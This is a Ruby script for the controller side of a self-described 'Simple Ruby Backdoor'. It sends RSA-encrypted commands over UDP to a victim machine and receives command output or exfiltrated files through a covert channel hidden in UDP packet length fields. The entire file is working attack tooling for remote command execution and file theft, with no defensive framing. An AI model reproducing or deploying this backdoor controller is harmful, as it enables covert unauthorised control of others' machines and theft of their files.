#!/usr/bin/env ruby

require 'rubygems'
require 'openssl'
require 'base64'
require 'packetfu'
require 'thread'
require 'micro-optparse'

include OpenSSL

# Encryption scheme
def encrypt(data)
	key = OpenSSL::PKey::RSA.new File.read 'public_key.pub'
	return key.public_key.public_encrypt(data)
end

def cap()

options = Parser.new do |p|
  p.banner = "Welcome to the Simple Ruby Backdoor (SRB), see below for usage"
  p.version = "SRB version 1.0"
  p.option :adap, "Sets the interface, default - eth0", :default => "eth0"
  p.option :target, "Defines the victim's IP", :default => "192.168.149.149"
  p.option :dport, "and port (dest.)", :default => 7000
  p.option :cmd, "Command to send, default - pwd", :default => "pwd"
  p.option :cport, "Call port for response", :default => 7001
  p.option :fget, "Get files? (yes or leave blank if not)", :default => false
  p.option :fname, "File name(s) for exfiltration (e.g. test.txt - default)", :default => "test.txt" # Simply use an array ([]) for multiple files
end.process!

inf = options[:adap]
vicIP = options[:target]

config = PacketFu::Utils.whoami?(:iface => inf)
udp_packet = PacketFu::UDPPacket.new()

udp_packet.eth_saddr = config[:eth_saddr]
udp_packet.ip_saddr = config[:ip_saddr]
udp_packet.ip_daddr = vicIP
udp_packet.udp_src = 1024 + rand(65535 - 1024)
udp_packet.udp_dst = options[:dport]

# Send command (encrypted)
puts "Encrypting command..."
puts "\n"

if options[:fget] == false
	udp_packet.payload = encrypt("#{options[:cmd]}")
else 
	udp_packet.payload = encrypt("#{options[:fname]}")
end
		
udp_packet.recalc

puts "Sending command..."
puts "\n"
udp_packet.to_w(inf)

# Wait for call
capture = PacketFu::Capture.new(:iface => inf, :start => true,
									:promisc => true, :filter => "udp dst port #{options[:cport]}",
									:save => true)

puts "Capturing (UDP)..."
puts "\n"

output = ""
more = true

if options[:fget] == false

capture.stream.each do |pkt|

	# Capture command output
	packet = PacketFu::Packet.parse(pkt)

	if more == true
		recv = [packet.udp_len.to_s(16)].pack("H*")
		puts "Received bytes..."
		puts recv
		output.concat(recv)
	
		if !recv.index('~f').nil?
			puts "Output:"
			puts output
			output.clear
			more = false
		end
	
	end

end

else

name = options[:fname]
file = File.open(name, "wb")

capture.stream.each do |pkt|

	# Capture file contents
	packet = PacketFu::Packet.parse(pkt)

	recv = [packet.udp_len.to_s(16)].pack("H*")
	puts recv
	output.concat(recv)
	
	file.write(output)
	output.clear
	
	if recv.index('~f')
		puts "Got file!"
		file.close
	end

	puts "Writing bytes to file..."

end

	end

end 

cap_thread = Thread.new do
	loop do
		# Crude way to quit, for convenience
		Kernel.exit if gets =~ /^C/
	end
end

cap()
